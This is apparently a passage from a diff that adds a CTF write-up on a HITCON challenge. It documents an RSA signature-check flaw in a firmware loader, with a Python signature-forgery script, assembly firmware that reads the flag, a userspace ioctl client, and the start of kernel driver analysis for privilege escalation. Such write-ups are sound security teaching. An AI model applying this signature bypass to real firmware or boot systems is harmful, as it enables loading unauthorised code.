+<span class="n">wait_for_interrupt</span><span class="p">()</span>
+<span class="c1"># pause()
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Got interrupt, firmware is done now!"</span><span class="p">)</span>
+
+<span class="n">output</span> <span class="o">=</span> <span class="n">read_outputbuf</span><span class="p">()</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Output buffer of firmware is:</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">hexdump</span><span class="p">(</span><span class="n">output</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"As string:</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">output</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">))</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="part-1-firmware">Part 1: Firmware</h2>
+
+<p>The firmware can request the flag for this challenge from the
+sandbox by using the <code class="language-plaintext highlighter-rouge">get_flag</code> syscall, and then write it to the CHAOS memory where our client in userspace can read it. Unfortunately the provided firmware never uses this system call, so there is no way to get the flag without either pwning the firmware from userspace or creating our own firmware that gets the flag and passes the RSA signature check. Since the challenge is in both the crypto and the pwn category and we can supply our own firmware, we tried to look for a way to bypass the signature check. This is the function that validates the firmware:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">firmware_header</span> <span class="p">{</span>
+  <span class="kt">uint32_t</span> <span class="n">size</span><span class="p">;</span>
+  <span class="kt">uint8_t</span> <span class="n">key_size</span><span class="p">;</span>
+  <span class="kt">uint8_t</span> <span class="n">key</span><span class="p">[</span><span class="mi">255</span><span class="p">];</span>
+  <span class="kt">uint8_t</span> <span class="n">signature</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+  <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[];</span>
+<span class="p">};</span>
+
+<span class="k">static</span> <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">pubkey</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/*...*/</span> <span class="p">};</span>
+
+<span class="kt">void</span> <span class="nf">load_firmware</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">uint32_t</span> <span class="n">firmware_offset</span><span class="p">;</span> <span class="c1">// esi</span>
+  <span class="kt">uint32_t</span> <span class="n">firmware_size</span><span class="p">;</span> <span class="c1">// eax</span>
+  <span class="n">firmware_header</span> <span class="o">*</span><span class="n">firmware</span><span class="p">;</span> <span class="c1">// rbx</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key_size</span><span class="p">;</span> <span class="c1">// er14</span>
+  <span class="n">buffer</span> <span class="o">*</span><span class="n">p_result</span><span class="p">;</span> <span class="c1">// rcx</span>
+  <span class="n">buffer</span> <span class="o">*</span><span class="n">p_firm_sha</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="n">buffer</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// rdx</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// ebp</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">signature_size</span><span class="p">;</span> <span class="c1">// ebx</span>
+  <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">sha_data</span><span class="p">;</span> <span class="c1">// r12</span>
+  <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">x</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">int</span> <span class="n">rsa_e</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-29Ch] BYREF</span>
+  <span class="n">buffer</span> <span class="n">firm_data</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-298h] BYREF</span>
+  <span class="n">buffer</span> <span class="n">firm_sha</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-288h] BYREF</span>
+  <span class="n">buffer</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-278h] BYREF</span>
+  <span class="n">buffer</span> <span class="n">signature</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-268h] BYREF</span>
+  <span class="n">buffer</span> <span class="n">e</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp-258h] BYREF</span>
+  <span class="n">buffer</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// [rsp+60h] [rbp-248h] BYREF</span>
+  <span class="n">firmware_header</span> <span class="n">header</span><span class="p">;</span> <span class="c1">// [rsp+70h] [rbp-238h] BYREF</span>
+
+  <span class="n">firmware_offset</span> <span class="o">=</span> <span class="n">csr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+  <span class="n">firmware_size</span> <span class="o">=</span> <span class="n">csr</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+  <span class="c1">// Size/bounds checks</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">firmware_size</span> <span class="o">&lt;=</span> <span class="mh">0x204</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">csr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">22</span><span class="p">;</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">firmware</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">dram_file</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">firmware_offset</span><span class="p">];</span>
+  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="n">firmware</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">header</span><span class="p">));</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">header</span><span class="p">.</span><span class="n">size</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">header</span><span class="p">)</span> <span class="o">!=</span> <span class="n">firmware_size</span> <span class="o">||</span> <span class="n">header</span><span class="p">.</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">firmware_data</span><span class="p">.</span><span class="n">size</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="n">csr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">22</span><span class="p">;</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">make_buffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">firm_data</span><span class="p">,</span> <span class="n">firmware</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">header</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
+  <span class="n">calc_sha256</span><span class="p">(</span><span class="o">&amp;</span><span class="n">firm_sha</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">firm_data</span><span class="p">);</span>
+
+  <span class="c1">// Check the public key that signed the firmware.</span>
+  <span class="n">key_size</span> <span class="o">=</span> <span class="n">header</span><span class="p">.</span><span class="n">key_size</span><span class="p">;</span>
+  <span class="n">make_buffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">n</span><span class="p">,</span> <span class="n">firmware</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">,</span> <span class="n">header</span><span class="p">.</span><span class="n">key_size</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="n">pubkey</span><span class="p">,</span> <span class="mi">128</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">csr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">129</span><span class="p">;</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">make_buffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">signature</span><span class="p">,</span> <span class="n">firmware</span><span class="o">-&gt;</span><span class="n">signature</span><span class="p">,</span> <span class="n">key_size</span><span class="p">);</span>
+
+  <span class="c1">// Verify the signature.</span>
+  <span class="n">rsa_e</span> <span class="o">=</span> <span class="mh">0x10001</span><span class="p">;</span>
+  <span class="n">make_buffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">e</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rsa_e</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+  <span class="n">do_rsa_encrypt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">result</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">e</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">signature</span><span class="p">);</span>
+
+  <span class="n">p_result</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">result</span><span class="p">;</span>
+  <span class="n">p_firm_sha</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">firm_sha</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="n">p_firm_sha</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
+    <span class="n">signature_size</span> <span class="o">=</span> <span class="n">p_result</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;=</span> <span class="n">signature_size</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="n">v7</span> <span class="o">=</span> <span class="n">p_firm_sha</span><span class="p">;</span>
+    <span class="n">p_firm_sha</span> <span class="o">=</span> <span class="n">p_result</span><span class="p">;</span>
+    <span class="n">p_result</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">sha_data</span> <span class="o">=</span> <span class="n">p_firm_sha</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">sha_data</span><span class="p">,</span> <span class="n">p_result</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">signature_size</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">sha_data</span><span class="p">[</span><span class="n">signature_size</span><span class="p">];</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">signature_size</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">x</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="o">++</span><span class="n">signature_size</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Firmware valid</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">firmware_data</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="n">firm_data</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="n">firm_data</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
+    <span class="n">csr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8000000000000000LL</span><span class="p">;</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+<span class="nl">fail:</span>
+  <span class="n">csr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">74</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The firmware verifies only the first 128 bytes of N, but N can be up to 255 bytes long, with the size controlled by us. Furthermore, there are no checks that N is actually a product of two primes. This means that we can sign the firmware with our own RSA key as long as the first 128 bytes of the modulus match the key accepted by the sandbox.</p>
+
+<p>In short, we have to find a number $N’$ that is equal to the challenge’s $N$ in the lowest 128 bytes such that $\phi(N’)$ is easy to compute. Once we have $\phi(N’)$ we can compute the private key and sign our own firmware. The intended solution is to look for a prime $N’$, since then $\phi(N’) = N’ - 1$, but we didn’t think about this during the CTF and instead looked for a composite $N’$ that was easy to factor by setting bits above 1024.</p>
+
+<p>Our teammate Aaron eventually found that $N’ = (N \mod 2^{1024}) + 2^{1034}$ works and factors to 13 * 691267 * 20502125755394762434933579089125449307897345968084091731229436353808955447773787435286551243437724264561546459801643475331591701959705793105612360650011316069145033629055595572330904990306691542449400499839249687299626423918040370229280752606812185791663127069532707770334540305571214081730144598191170073. This script produces a valid signature for an arbitrary binary:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
+<span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">prod</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="s">'shellcode.bin'</span><span class="p">)</span>
+
+<span class="n">header</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="n">header</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x82</span><span class="p">)</span>
+<span class="n">header</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"0fff0ee945bd4176f55a40543b3666843a0d565c339e5d8969fcd7ca921cc303a1c8af16240c4d032d1931632b90996dd48aebacee307d3c57bc83375698ae7df90d10163edee9e067ce46e738092257dafb15b80fb65961900deffa9b59b57e472bf56be0d9f648ad6908f2553be13a9ea0cda24317756cba5142a95e21f9e000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"</span><span class="p">)</span>
+
+<span class="n">factors</span> <span class="o">=</span> <span class="p">[</span><span class="mi">13</span><span class="p">,</span> <span class="mi">691267</span><span class="p">,</span> <span class="mi">20502125755394762434933579089125449307897345968084091731229436353808955447773787435286551243437724264561546459801643475331591701959705793105612360650011316069145033629055595572330904990306691542449400499839249687299626423918040370229280752606812185791663127069532707770334540305571214081730144598191170073</span><span class="p">]</span>
+<span class="n">phi</span><span class="o">=</span><span class="n">prod</span><span class="p">([</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">factors</span><span class="p">])</span>
+<span class="n">dec</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="mh">0x10001</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
+
+<span class="n">act</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">shellcode</span><span class="p">).</span><span class="n">digest</span><span class="p">(),</span> <span class="s">"little"</span><span class="p">)</span>
+<span class="n">header</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">act</span><span class="p">,</span> <span class="n">dec</span><span class="p">,</span> <span class="n">prod</span><span class="p">(</span><span class="n">factors</span><span class="p">)),</span> <span class="mi">256</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"firmware"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">header</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now that we can sign and load our own firmware, we only have to write some code that loads the flag using the <code class="language-plaintext highlighter-rouge">get_flag</code> syscall and makes it available to the client. The easiest way is to have our client allocate and map a buffer in the CHAOS memory, then send a request to CHAOS. The firmware can then copy the flag in the response buffer and exit. Since we hadn’t yet finished reversing the interface between CHAOS and the driver, we just wrote a firmware that copies the flag everywhere in the CHAOS memory instead of finding the buffer that the client is using.</p>
+
+<pre><code class="language-x86asm">BITS 64
+DEFAULT rel
+
+dram_size equ 0x100000
+dram_start equ 0x10000000
+dram_end equ dram_start + dram_size
+
+.copy_loop2:
+    ; get flag
+    mov rdi, dram_start
+    mov eax, 0xC89FC
+    syscall
+
+    mov rax, dram_start + 0x50
+
+    .copy_loop
+        mov rsi, dram_start
+        mov rdi, rax
+        mov rcx, 0x50
+        rep movsb
+
+        add rax, 0x50
+        cmp rax, dram_end
+        jb .copy_loop
+
+jmp .copy_loop2
+
+; exit
+mov edi, 0
+mov eax, 60
+syscall
+</code></pre>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">request</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">field_0</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">field_4</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">field_8</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">field_c</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">field_10</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">field_14</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">out_size</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/chaos"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">fd</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x4008CA00</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">mem</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">request</span> <span class="n">req</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">field_0</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_8</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_c</span> <span class="o">=</span> <span class="mi">256</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_10</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">out_size</span> <span class="o">=</span> <span class="mi">256</span><span class="p">,</span>
+    <span class="p">};</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xC01CCA00</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">);</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">mem</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">hitcon{when the secure bootloader is not secure}</code></p>
+
+<h2 id="part-2-kernel">Part 2: Kernel</h2>
+
+<p>The flag for this part is in the VM, only readable to root. This means that we have to somehow exploit the kernel from our unprivileged client to become root. We control both the userspace client and the firmware, so we can attack the kernel from both sides.</p>
+
+<h3 id="dma-attack">DMA attack</h3>
+
+<p>CHAOS uses a virtual PCI device. PCI is interesting from an attacker’s point of view because it is bus mastering, which means that the devices can DMA to the host’s memory. Pwning the kernel from such a device would be really easy because the device can read and write to all of physical memory. Unfortunately the virtual PCI device in Qemu doesn’t use DMA, so it’s impossible to DMA to the host memory from the device’s firmware. All that the firmware can do is to write to its MMIO registers and its dedicated memory. Too bad.</p>
+
+<h3 id="chaos-driver-analysis">CHAOS driver analysis</h3>
+
+<p>We cannot directly attack the VM’s kernel from the firmware, so it is very likely that we will need to find a bug in the driver and exploit it. We spent a few hours reversing the driver and understanding how it works and eventually found some bugs.</p>
+
+<p>Recall that the driver uses two ring buffers to communicate with CHAOS. The driver puts commands in the command queue and receives responses in the response queue. Here is the code that adds a new command to the queue:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">chaos_mailbox_request</span><span class="p">(</span><span class="k">struct</span> <span class="n">chaos_mailbox</span> <span class="o">*</span><span class="n">mailbox</span><span class="p">,</span> <span class="k">struct</span> <span class="n">chaos_request</span> <span class="o">*</span><span class="n">req</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">chaos_cmd_desc</span> <span class="n">cmd_desc</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+  <span class="c1">// Generate a request ID.</span>
+  <span class="kt">int</span> <span class="n">request_id</span> <span class="o">=</span> <span class="n">_InterlockedExchangeAdd</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">request_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="c1">// Copy the request to the CHAOS memory.</span>
+  <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">chaos_dram_alloc</span><span class="p">(</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">chaos_state</span><span class="o">-&gt;</span><span class="n">dram_pool</span><span class="p">,</span> <span class="mi">28LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dram_request</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">struct</span> <span class="n">chaos_req</span> <span class="o">*</span><span class="n">dram_req</span> <span class="o">=</span> <span class="n">dram_request</span><span class="p">.</span><span class="n">virt_addr</span><span class="p">;</span>
+  <span class="n">memcpy</span><span class="p">(</span><span class="n">dram_req</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">chaos_request</span><span class="p">));</span>
+
+  <span class="k">struct</span> <span class="n">chaos_state</span> <span class="o">*</span><span class="n">chaos_state</span> <span class="o">=</span> <span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">chaos_state</span><span class="p">;</span>
+  <span class="kt">uint64_t</span> <span class="n">cmd_tail</span> <span class="o">=</span> <span class="n">chaos_state</span><span class="o">-&gt;</span><span class="n">csrs</span><span class="p">.</span><span class="n">virt_addr</span><span class="o">-&gt;</span><span class="n">cmd_tail</span><span class="p">;</span>
+
+  <span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">cmdq_lock</span><span class="p">);</span>
+  <span class="kt">uint64_t</span> <span class="n">cmd_head</span> <span class="o">=</span> <span class="n">chaos_state</span><span class="o">-&gt;</span><span class="n">csrs</span><span class="p">.</span><span class="n">virt_addr</span><span class="o">-&gt;</span><span class="n">cmd_head</span><span class="p">;</span>
+
+  <span class="c1">// Check if the command queue is already full.</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">cmd_head</span> <span class="o">^</span> <span class="n">cmd_tail</span><span class="p">)</span> <span class="o">==</span> <span class="mi">512</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">cmdq_lock</span><span class="p">);</span>
+    <span class="n">chaos_dram_free</span><span class="p">(</span><span class="n">pool</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dram_request</span><span class="p">);</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">16</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">cmd_desc</span><span class="p">.</span><span class="n">req_id</span> <span class="o">=</span> <span class="n">request_id</span><span class="p">;</span>
+  <span class="n">cmd_desc</span><span class="p">.</span><span class="n">unk</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">cmd_desc</span><span class="p">.</span><span class="n">buf_offset</span> <span class="o">=</span> <span class="n">dram_request</span><span class="p">.</span><span class="n">phys_addr</span> <span class="o">-</span> <span class="n">pool</span><span class="o">-&gt;</span><span class="n">dram_io_map</span><span class="o">-&gt;</span><span class="n">phys_addr</span><span class="p">;</span>
+  <span class="n">cmd_desc</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">28</span><span class="p">;</span>
+
+  <span class="c1">// Add the request to the command queue.</span>
+  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">cmd_queue</span><span class="p">.</span><span class="n">virt_addr</span><span class="p">[</span><span class="n">cmd_head</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffffdff</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">cmd_desc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cmd_desc</span><span class="p">));</span>
+  <span class="n">chaos_state</span><span class="o">-&gt;</span><span class="n">csrs</span><span class="p">.</span><span class="n">virt_addr</span><span class="o">-&gt;</span><span class="n">cmd_head</span> <span class="o">=</span> <span class="p">(</span><span class="n">cmd_head</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3FF</span><span class="p">;</span>
+  <span class="n">mutex_unlock</span><span class="p">(</span><span class="n">p_cmdq_lock</span><span class="p">);</span>
+
+  <span class="c1">// Set the response to pending in the response queue.</span>
+  <span class="kt">int</span> <span class="n">resp_idx</span> <span class="o">=</span> <span class="n">request_id</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">;</span>
+  <span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">responses</span><span class="p">[</span><span class="n">resp_index</span><span class="p">].</span><span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">100</span><span class="p">;</span>
+
+  <span class="c1">// Send an interrupt to the device.</span>
+  <span class="n">chaos_state</span><span class="o">-&gt;</span><span class="n">csrs</span><span class="p">.</span><span class="n">virt_addr</span><span class="o">-&gt;</span><span class="n">device_irq</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="n">_cond_resched</span><span class="p">();</span>
+  <span class="kt">uint32_t</span> <span class="n">result</span> <span class="o">=</span> <span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">responses</span><span class="p">[</span><span class="n">resp_index</span><span class="p">].</span><span class="n">result</span><span class="p">;</span>
+  <span class="n">bool</span> <span class="n">timed_out</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+  <span class="c1">// Wait for the request to complete.</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">long</span> <span class="n">time_left</span> <span class="o">=</span> <span class="mi">2000</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">wait_queue_entry</span> <span class="n">wq_entry</span><span class="p">;</span>
+    <span class="n">init_wait_entry</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wq_entry</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">prepare_to_wait_event</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">waitq</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wq_entry</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">);</span>
+
+    <span class="c1">// Wait up to 2000 jiffies.</span>
